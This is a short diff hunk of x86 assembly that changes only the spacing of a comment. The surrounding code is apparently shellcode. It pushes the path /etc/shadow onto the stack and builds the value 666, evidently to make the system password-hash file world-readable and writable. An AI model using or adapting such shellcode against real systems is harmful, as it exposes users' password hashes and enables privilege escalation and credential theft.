@@ -80,7 +80,7 @@ _start:
   mov dword [esp-12], 0x6374652f              ;/etc/shadow
   sub esp, 12                                 ;stack adjustment
   mov esi, esp                                ;move pointer to args into esi
-  xchg ebx, esi                              ;move pointer to args into ebx
+  xchg ebx, esi                               ;move pointer to args into ebx
   push word 0x16d                             ;push 555
   pop ecx                                     ;pop it into ecx
   add ecx, 0x49                               ;add 111 to ecx, which makes it 666
